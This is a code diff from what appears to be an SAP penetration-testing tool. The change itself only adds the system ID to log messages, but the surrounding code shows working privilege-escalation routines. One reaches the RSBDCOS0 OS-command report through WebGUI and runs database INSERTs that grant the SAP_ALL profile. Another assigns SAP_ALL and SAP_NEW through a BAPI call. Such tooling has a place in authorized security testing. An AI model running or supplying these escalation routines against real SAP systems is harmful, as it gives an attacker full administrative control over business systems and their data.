@@ -82,15 +82,15 @@ def try_lpe(node: SAPNode, creds: Credentials,
           f"{creds.username}@{node.sid} client {creds.client} ===")
 
     for m in methods:
-        print(f"[*] Trying LPE method: {m.name} — {m.description}")
+        print(f"[*] {node.sid}: Trying LPE method: {m.name} — {m.description}")
         try:
             if m.fn(node, creds):
-                print(f"[+] LPE succeeded via {m.name}!")
+                print(f"[+] {node.sid}: LPE succeeded via {m.name}!")
                 return True
-            print(f"[-] LPE method {m.name}: did not succeed")
+            print(f"[-] {node.sid}: LPE method {m.name}: did not succeed")
         except Exception as e:
             logger.debug(f"LPE {m.name} error: {e}")
-            print(f"[-] LPE method {m.name} error: {e}")
+            print(f"[-] {node.sid}: LPE method {m.name} error: {e}")
 
     print(f"[-] All LPE methods exhausted for {creds.username}@{node.sid}")
     return False
@@ -311,47 +311,47 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
     """
     host = node.ip or node.hostname
     if not host:
-        print("[-] No IP/hostname available")
+        print(f"[-] {node.sid}: No IP/hostname available")
         return False
 
     db_type = node.db_type or ""
     db_key = normalize_db_type(db_type)
     if not db_key or db_key not in SQL_GENERATORS:
-        print(f"[-] Unknown DB type: {db_type!r} — cannot generate SQL")
+        print(f"[-] {node.sid}: Unknown DB type: {db_type!r} — cannot generate SQL")
         return False
 
     inst_nr = creds.instance_nr or "00"
 
     # Find the WebGUI HTTP port
-    print(f"[*] Searching for WebGUI HTTP port on {host}...")
+    print(f"[*] {node.sid}: Searching for WebGUI HTTP port on {host}...")
     base_url = _find_webgui_port(host, inst_nr)
     if not base_url:
-        print("[-] No WebGUI HTTP port found")
+        print(f"[-] {node.sid}: No WebGUI HTTP port found")
         return False
-    print(f"[+] WebGUI at {base_url}")
+    print(f"[+] {node.sid}: WebGUI at {base_url}")
 
     # Generate the SAP_ALL SQL statements
     sid = node.sid or "SAP"
     sql_stmts = _sql_assign_sap_all(sid, creds.client, creds.username, db_type)
     if not sql_stmts:
-        print("[-] No SQL statements generated — check DB type")
+        print(f"[-] {node.sid}: No SQL statements generated — check DB type")
         return False
-    print(f"[*] {len(sql_stmts)} SQL statements to execute for SAP_ALL")
+    print(f"[*] {node.sid}: {len(sql_stmts)} SQL statements to execute for SAP_ALL")
 
     # Open ONE WebGUI session and reuse it for all commands.
     # Between commands, use okcode to restart RSBDCOS0 in the same session.
-    print(f"[*] Opening WebGUI session...")
+    print(f"[*] {node.sid}: Opening WebGUI session...")
     session, post_url, moin, text = _webgui_session(
         base_url, creds,
         "*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
     )
     if not session:
-        print("[-] Could not open WebGUI session")
+        print(f"[-] {node.sid}: Could not open WebGUI session")
         return False
     if "Execute OS Command" not in text:
-        print("[-] RSBDCOS0 screen not reached")
+        print(f"[-] {node.sid}: RSBDCOS0 screen not reached")
         return False
-    print(f"[+] RSBDCOS0 ready")
+    print(f"[+] {node.sid}: RSBDCOS0 ready")
 
     field_sid = "wnd[0]/usr/txt[0,8]"
     executed = 0
@@ -361,7 +361,7 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
         if not os_cmd:
             continue
 
-        print(f"[*] [{i+1}/{len(sql_stmts)}] SQL: {sql}")
+        print(f"[*] {node.sid}: [{i+1}/{len(sql_stmts)}] SQL: {sql}")
         print(f"    CMD: {os_cmd}")
 
         # Execute the command
@@ -376,7 +376,7 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
         elif ti and "Execute OS Command" in str(ti):
             executed += 1
         else:
-            print(f"[-]   Command execution failed")
+            print(f"[-] {node.sid}:   Command execution failed")
             # Try to recover the session by re-opening RSBDCOS0 via okcode
             moin, resp, ti = _webgui_okcode(
                 session, post_url, moin,
@@ -392,10 +392,10 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
                 "/n*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
             )
             if "Execute OS Command" not in str(ti) + resp:
-                print("[-] Could not restart RSBDCOS0, stopping")
+                print(f"[-] {node.sid}: Could not restart RSBDCOS0, stopping")
                 break
 
-    print(f"[*] Executed {executed}/{len(sql_stmts)} SQL statements")
+    print(f"[*] {node.sid}: Executed {executed}/{len(sql_stmts)} SQL statements")
 
     if executed == 0:
         return False
@@ -409,7 +409,7 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
                f"WHERE MANDT='{creds.client}' AND BNAME='{username_uc}'")
     buf_cmd = _build_os_command_for_sql(buf_sql, db_type, sid, inst_nr)
     if buf_cmd:
-        print(f"[*] Triggering user buffer refresh via USR02 update...")
+        print(f"[*] {node.sid}: Triggering user buffer refresh via USR02 update...")
         moin, resp, ti = _webgui_okcode(
             session, post_url, moin,
             "/n*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
@@ -425,7 +425,7 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
     # logon+logoff.  The kernel re-reads the user's authorizations from
     # the DB on each new logon; this makes the newly inserted SAP_ALL
     # effective immediately for subsequent RFC calls.
-    print(f"[*] Refreshing authorization buffer (RFC logon/logoff)...")
+    print(f"[*] {node.sid}: Refreshing authorization buffer (RFC logon/logoff)...")
     try:
         import sapmap_rfc
         with sapmap_rfc._get_connection(node, creds) as conn:
@@ -433,13 +433,13 @@ def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
                 'RFC_PING',
                 conn._make_func_desc('RFC_PING', []),
             )
-        print(f"[+] Buffer refreshed — SAP_ALL is now active")
+        print(f"[+] {node.sid}: Buffer refreshed — SAP_ALL is now active")
     except Exception as e:
         logger.debug(f"Buffer refresh RFC logon failed: {e}")
-        print(f"[!] Buffer refresh logon failed: {str(e).split(chr(10))[0]}")
-        print(f"[!] SAP_ALL is in the DB but may need a manual re-logon to activate")
+        print(f"[!] {node.sid}: Buffer refresh logon failed: {str(e).split(chr(10))[0]}")
+        print(f"[!] {node.sid}: SAP_ALL is in the DB but may need a manual re-logon to activate")
 
-    print(f"[+] SAP_ALL assigned to {creds.username} via database INSERTs")
+    print(f"[+] {node.sid}: SAP_ALL assigned to {creds.username} via database INSERTs")
     return True
 
 
@@ -485,15 +485,15 @@ def lpe_bapi_profiles_assign(node: SAPNode, creds: Credentials) -> bool:
                 ret = [ret]
             for r in ret:
                 if r.get("TYPE", "") in ("E", "A"):
-                    print(f"[-] BAPI error: {r.get('MESSAGE', '?')}")
+                    print(f"[-] {node.sid}: BAPI error: {r.get('MESSAGE', '?')}")
                     return False
 
             # Commit the change
             conn.call("BAPI_TRANSACTION_COMMIT", WAIT="X")
-            print(f"[+] SAP_ALL + SAP_NEW assigned via BAPI")
+            print(f"[+] {node.sid}: SAP_ALL + SAP_NEW assigned via BAPI")
             return True
     except Exception as e:
         logger.debug(f"BAPI_USER_PROFILES_ASSIGN failed: {e}")
         err = str(e).split("\n")[0]
-        print(f"[-] RFC call failed: {err}")
+        print(f"[-] {node.sid}: RFC call failed: {err}")
         return False
